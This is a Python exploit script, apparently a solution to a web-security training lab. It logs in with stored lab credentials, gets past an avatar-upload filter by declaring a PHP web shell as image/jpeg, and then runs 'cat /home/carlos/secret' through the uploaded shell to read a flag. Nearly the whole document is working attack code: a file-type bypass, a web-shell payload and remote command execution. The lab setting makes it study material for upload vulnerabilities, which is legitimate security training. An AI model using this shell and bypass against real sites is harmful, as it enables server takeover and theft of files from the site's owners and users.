import requests
import argparse
from lxml import html
import pyperclip
import time

username = "wiener"
password = "peter"


if __name__ == "__main__":
    start_time = time.perf_counter()

    parser = argparse.ArgumentParser(prog="Remote Code Execution Via Webshell Upload")
    parser.add_argument(
        "-u", "--lab-url", help="Your lab instance URL is required", required=True
    )

    args = parser.parse_args()

    lab_url = args.lab_url.strip("/")

    # Creating a Session Object
    # https://docs.python-requests.org/en/latest/api/#request-sessions
    session = requests.Session()

    # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
    login_page_tree = html.fromstring(session.get(url=f"{lab_url}/login").text)

    # Extracting the login form csrf token using xpath
    login_csrf_token = login_page_tree.xpath('//input[@name="csrf"]/@value')[0]
    print(f"[+] Login CSRF Token: {login_csrf_token}")

    # Logging in as the given user and generating the tree for My Account page
    my_account_page_tree = html.fromstring(
        session.post(
            url=f"{lab_url}/login",
            data={"username": username, "password": password, "csrf": login_csrf_token},
        ).text
    )

    # Extracting the avatar upload form csrf token
    my_account_avatar_upload_csrf = my_account_page_tree.xpath(
        '//form[@id="avatar-upload-form"]/input[@name="csrf"]/@value'
    )[0]
    print(f"[+] My Account Avatar CSRF Token: {login_csrf_token}")

    # Uploading the payload
    avatar_file_upload_response = session.post(
        url=f"{lab_url}/my-account/avatar",
        data={
            "user": username,
            "csrf": my_account_avatar_upload_csrf,
        },
        files={
            # File Tuple Syntax: (filename, file-content, content-type)
            "avatar": (
                "web-shell.php",
                "<?php echo system($_GET['command']); ?>",
                # Bypassing the Content-Type restriction
                "image/jpeg",
            )
        },
    )

    if avatar_file_upload_response.ok:
        flag = session.get(
            url=f"{lab_url}/files/avatars/web-shell.php?command=cat /home/carlos/secret"
        ).text

        # When I was trying this lab, the response contains the flag duplicated like this: <flag><flag>
        # To get the correct flag, simply split the string in half and compare the two halves.
        # If they are equal, keep only one half of the flag
        half = len(flag) // 2
        if flag[:half] == flag[half:]:
            flag = flag[:half]

        print(f"[+] Flag: {flag}")

        # Copying flag to clipboard
        pyperclip.copy(flag)
        print("[+] Flag copied to clipboard")
    else:
        print("[-] Failed to Fetch Flag")

    end_time = time.perf_counter()
    print(f"[+] Total Time Taken: {end_time - start_time}")
